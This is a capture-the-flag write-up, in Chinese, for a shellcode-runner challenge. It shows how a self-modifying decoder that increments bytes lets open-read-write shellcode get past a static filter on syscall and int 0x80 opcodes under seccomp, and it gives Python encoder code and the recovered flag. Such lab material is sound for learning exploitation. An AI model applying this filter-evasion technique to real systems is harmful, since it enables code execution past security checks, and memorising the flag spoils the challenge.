# secure_blob_runner

## 题目简述

程序仍会把输入放入 RWX 内存执行，但在执行前扫描整页，拒绝出现 `0x0f`、`0x05`、`0xcd`、`0x80`，从而阻止直接提交 `syscall` 或 `int 0x80` 指令。随后安装 seccomp，只允许 `open`、`read`、`write`、`exit` 和 `exit_group`。

因此需要提交一段不含禁用字节的自修改 Shellcode：运行时先把被修改的系统调用字节修复，再执行 ORW 读取 Flag。

## 解题过程

先编写普通 amd64 ORW Shellcode，依次执行：

```text
open("./flag.txt", O_RDONLY)
read(fd, buffer, 0x20)
write(1, buffer, 0x20)
exit(0)
```

然后对机器码逐字节扫描。每遇到 `0x05`、`0x0f`、`0x80`、`0xcd` 或会被 `fgets` 截断的换行 `0x0a`，就在最终载荷中把该字节减一，并在前置解码器中加入：

```asm
inc byte ptr [r10 + offset]
```

官方包装器的核心逻辑是：

```python
bad = bytearray(asm(orw_shellcode))
offsets = []
for i, value in enumerate(bad):
    if value in (0x05, 0x0f, 0x80, 0xcd, 0x0a):
        offsets.append(i)
        bad[i] -= 1

decoder = asm("mov r10, rax")
for off in offsets:
    decoder += asm(f"inc byte ptr [r10+{off}]")
payload = build_position_independent_prefix(decoder, bytes(bad))
```

入口时 `rax` 指向映射页，前置代码计算编码主体的实际地址并原地加一修复。静态扫描只看到编码后的安全字节；修复发生在 seccomp 安装完成后的运行阶段。执行后得到：

```text
greyhats{sh311c0d3-p0lym0rph15m}
```

## 方法总结

- 核心技巧：用位置无关的自修改解码器绕过静态坏字节检查，再执行 seccomp 允许的 ORW 链。
- 识别信号：RWX Shellcode runner、禁用系统调用机器码、seccomp 仍放行文件读写系统调用。
- 复用要点：解码器自身也必须不含坏字节；除题目过滤字节外，还要考虑输入函数的换行和 NUL 行为。
